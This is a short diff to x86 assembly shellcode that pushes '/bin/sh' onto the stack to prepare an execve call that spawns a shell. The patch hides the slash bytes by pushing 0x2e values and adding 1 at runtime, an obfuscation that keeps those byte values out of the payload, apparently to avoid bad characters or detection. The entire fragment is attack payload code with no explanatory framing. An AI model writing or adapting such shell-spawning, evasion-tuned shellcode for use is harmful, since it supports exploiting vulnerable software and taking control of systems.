@@ -5,8 +5,10 @@
 
 	; filename = "/bin/sh"
 	push byte 0x68
-	push word 0x732f
-	push dword 0x6e69622f
+	push word 0x732e
+	add word [esp], 0x1
+	push dword 0x6e69622e
+	add word [esp], 0x1
 	mov ebx, esp
 
 	; argv = { filename, NULL }
